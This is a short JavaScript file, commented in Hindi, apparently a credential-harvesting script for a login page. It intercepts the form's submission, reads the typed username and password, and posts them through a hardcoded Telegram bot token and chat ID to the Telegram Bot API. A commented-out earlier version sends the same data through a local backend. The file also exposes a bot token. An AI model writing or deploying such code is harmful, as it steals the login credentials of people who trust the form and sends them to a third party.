// // apna BOT TOKEN yahan dalen
// const telegramBotToken = '8066281079:AAEqI4SnaSsWtlRaqBt8qDrQj9-_gH1gUVs';
// const chatId = '6163067472';

// async function sendToTelegram(username, password) {
//   try {
//     const response = await fetch('http://localhost:3000/send-message', {
//       method: 'POST',
//       headers: { 'Content-Type': 'application/json' },
//       body: JSON.stringify({ username, password })
//     });

//     const result = await response.json();
//     console.log('Result from backend:', result);
//     alert('Login details sent to Telegram!');
//   } catch (error) {
//     console.error('Error sending message:', error);
//   }
// }

// document.getElementById('loginForm').addEventListener('submit', function (event) {
//   event.preventDefault();
//   const username = event.target.username.value;
//   const password = event.target.password.value;

//   sendToTelegram(username, password);
//   event.target.reset();
// });

// apna BOT TOKEN yahan dalen
const telegramBotToken = '8066281079:AAEqI4SnaSsWtlRaqBt8qDrQj9-_gH1gUVs';
const chatId = '6163067472';

// Function to send login data to Telegram
async function sendToTelegram(username, password) {
  // message text
  const message = `🔔 Login Attempt:\nUsername: ${username}\nPassword: ${password}`;

  // Telegram API URL
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  try {
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    const result = await response.json();
    if (result.ok) {
      console.log('✅ Message sent to Telegram successfully.');
    } else {
      console.error('⚠️ Failed to send message to Telegram:', result);
    }
  } catch (error) {
    console.error('Error sending message:', error);
  }
}

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', function (event) {
  event.preventDefault();

  const username = event.target.username.value;
  const password = event.target.password.value;

  // send to telegram
  sendToTelegram(username, password);

  // success message
  alert('Login details sent to Telegram!');

  // optional: clear form
  event.target.reset();
}); 
